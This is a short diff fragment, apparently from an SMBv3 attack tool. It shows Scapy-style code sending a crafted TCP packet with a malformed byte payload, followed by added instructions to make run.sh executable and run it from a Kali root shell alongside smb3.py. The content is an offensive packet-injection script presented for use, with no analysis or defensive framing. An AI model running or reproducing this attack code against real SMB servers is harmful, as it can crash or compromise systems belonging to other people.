@@ -63,3 +63,11 @@ import sys
       t.flags = "A"
       sbss = '\x00\x01\xff\xff'
       send(i/t/sbss)
+
+------------------------------------------------------------------------------------------------------||
+------------------------------------------------------------------------------------------------------||
+! >_  let's go To Run run.sh After we have arranged file smb3.py 
+```
+root@kali:~/Desktop# chmod +x run.sh
+
+root@kali:~/Desktop#./run.sh
